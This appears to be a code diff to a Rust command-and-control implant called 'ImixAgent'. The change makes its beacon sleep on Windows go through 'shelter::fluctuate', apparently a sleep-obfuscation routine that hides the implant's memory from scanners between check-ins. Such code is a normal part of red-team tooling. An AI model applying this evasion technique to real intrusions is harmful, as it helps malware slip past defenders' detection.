@@ -160,6 +160,21 @@ async fn sleep_until_next_cycle(agent: &ImixAgent, start: Instant) -> Result<()>
         interval,
         jitter
     );
-    tokio::time::sleep(delay).await;
+    #[cfg(target_os = "windows")]
+    {
+        let subtasks = agent.subtasks.lock().unwrap();
+        let has_subtasks = !subtasks.is_empty();
+        drop(subtasks);
+
+        if !has_subtasks {
+            let _ = shelter::fluctuate(true, Some(sleep_secs as u32), None);
+        } else {
+            tokio::time::sleep(delay).await;
+        }
+    }
+    #[cfg(not(target_os = "windows"))]
+    {
+        tokio::time::sleep(delay).await;
+    }
     Ok(())
 }
